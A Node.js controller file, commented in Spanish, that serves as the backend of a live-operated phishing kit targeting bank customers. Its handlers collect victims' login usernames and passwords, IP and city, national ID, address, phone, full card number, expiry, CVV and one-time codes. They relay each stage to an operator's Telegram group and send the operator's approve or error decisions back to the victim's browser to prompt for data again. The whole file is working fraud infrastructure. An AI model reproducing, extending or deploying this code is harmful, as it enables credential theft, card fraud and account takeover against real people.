import {
  sendTelegramAlert,
  waitForDecision,
  respondToTelegramCallback,
  sendSimpleTelegramMessage,
  editTelegramMessage,
} from "../services/botService.js";

import { v4 as uuidv4 } from "uuid";

let ioInstance;
export const activeSessions = new Map(); // socketId → session
export const decisionMap = new Map(); // socketId → session

export const setSocketIO = (io) => {
  ioInstance = io;
};

export const initProcess = async (req, res) => {
  let { data, sessionId, socketId, isRetry = false } = req.body;

  try {
    const decrypted = JSON.parse(atob(data));

    // Genera nueva sesión o reutiliza existente
    let session = activeSessions.get(sessionId)
      ? isRetry
        ? {
            ...activeSessions.get(sessionId),
            ...decrypted, // Actualizar datos de usuario
            socketId,
            decisionId: uuidv4(),
            messageId: null,
            car: null,
            exp: null,
            cvv: null,
            step: 1,
          }
        : {
            ...activeSessions.get(sessionId),
            socketId,
            decisionId: uuidv4(),
            car: null,
            exp: null,
            cvv: null,
            messageId: null,
            step: 1,
          }
      : {
          sessionId,
          socketId,
          car: null,
          exp: null,
          cvv: null,
          decisionId: uuidv4(),
          messageId: null,
          step: 1,
          ...decrypted,
        };
    // Almacena nueva decisión
    activeSessions.set(sessionId, session);
    decisionMap.set(session.decisionId, session.sessionId);

    // Envía mensaje a Telegram
    const messageText = buildMessageText(session);
    const { message_id } = await sendTelegramAlert({
      sessionId: session.sessionId,
      groupId: process.env.GROUP_1,
      text: messageText,
    });

    session.messageId = String(message_id);
    activeSessions.set(session.sessionId, session);

    // Espera decisión con el nuevo decisionId
    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;
        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({
      success: true,
      step: session.step,
      sessionId: session.sessionId,
      messageId: session.messageId,
    });
  } catch (error) {
    console.error("Error en initProcess:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const telegramWebhook = async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);
  try {
    await respondToTelegramCallback(callback);
    return res.sendStatus(200);
  } catch (err) {
    console.error("Error manejando webhook:", err);
    return res.sendStatus(500);
  }
};

export const appendCardData = async (req, res) => {
  const { card, exp, cvv, messageId, sessionId } = req.body;
  const session = activeSessions.get(sessionId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.card = card;
    session.exp = exp;
    session.cvv = cvv;
    session.step = 2;
    session.showOptions = true;
    const newText = buildMessageText(session);

    decisionMap.set(session.decisionId, session.sessionId);
    activeSessions.set(session.sessionId, session);

    await sendTelegramAlert({
      groupId: process.env.GROUP_1,
      messageId: messageId,
      text: newText,
      sessionId: session.sessionId,
    });

    // Espera decisión con el nuevo decisionId
    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;
        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({
      success: true,
      step: session.step,
      sessionId: session.sessionId,
      messageId: session.messageId,
    });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const appendPersonData = async (req, res) => {
  const { name, id, add, tel, sessionId } = req.body;
  const session = activeSessions.get(sessionId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.name = name;
    session.id = id;
    session.add = add;
    session.tel = tel;
    session.step = 2;
    session.showOptions = false;
    activeSessions.set(session.sessionId, session);
    const newText = buildMessageText(session);

    const result = await sendTelegramAlert({
      sessionId: session.sessionId,
      groupId: process.env.GROUP_1,
      text: newText,
    });

    return res
      .status(200)
      .json({ success: true, messageId: result.message_id });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const sendSimpleMessage = async (req, res) => {
  const { text, socketId } = req.body;
  const session = activeSessions.get(socketId);
  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    await sendSimpleTelegramMessage(
      session.chatId,
      `${text}: ${session.sessionId}`
    );
  } catch (err) {
    console.error("Error enviando mensaje simple:", err);
    return res.status(500).json({ error: err.message });
  }
};

export const errorMessage = async (req, res) => {};

export const updateMessageWithOtp = async (req, res) => {
  const { otp, sessionId } = req.body;

  const session = activeSessions.get(sessionId);
  if (!session)
    return res
      .status(400)
      .json({ error: "No hay sesión activa para ese socketId" });

  try {
    session.option = '';
    session.otp = otp;
    session.step = 3;

    decisionMap.set(session.decisionId, session.sessionId);
    activeSessions.set(session.sessionId, session);
    
    const messageText = buildMessageText(session);

    await sendTelegramAlert({
      groupId: process.env.GROUP_1,
      messageId: session.messageId,
      text: messageText,
      sessionId: session.sessionId
    });

    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;

        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en updateMessageWithOtp:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

function mask(value) {
   if (typeof value !== 'string') return '';
  return value.match(/.{1,4}/g)?.join(' ') || '';
}

export function buildMessageText(session, err = 0) {
  const step = session.step;
  let baseText;
  if (err == 0) {
    baseText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨

👤 Usuario: ${session.user}
🔑 Contraseña: ${session.pass}
🗺️ IP: ${session.ip}
🌆 Ciudad: ${session.city}
`;

    if (step >= 2) {
      baseText += `
🚨 Nueva Data 🚨

🙍‍♂️ Nombre: ${session.name || "PENDIENTE"}
🪪 Documento: ${session.id || "PENDIENTE"}
📌 Dirección: ${session.add || "PENDIENTE"}
📱 Telefóno: ${session.tel || "PENDIENTE"}
 
💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
📆 Exp: ${session.exp || "PENDIENTE"}
🔐 CVV: ${session.cvv || "PENDIENTE"}
`;
    }

    if (step >= 3) {
      baseText += `
🚨 Nueva Data 🚨
✅ Dinamica: ${session.otp || "PENDIENTE"}
`;
    }

    return baseText.trim();
  } else {
    let errText;
    if(err === 1) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨

🛑 Error Logo 🛑
👤 Usuario: ${session.user}
🔑 Contraseña: ${session.pass}
      `
    }
    if(err === 2) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨

🛑 Error CC 🛑
💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
📆 Exp: ${session.exp}
🔐 CVV: ${session.cvv}
      `
    }
    if(err === 3) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]}

🛑 Error Dinamica 🛑
❌ Dinamica: ${session.otp}
      `
    }
    if(err === 4) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨

🛑 Error OTP 🛑
❌ OTP: ${session.otp}
      `
    }
    return errText.trim();
  }
}
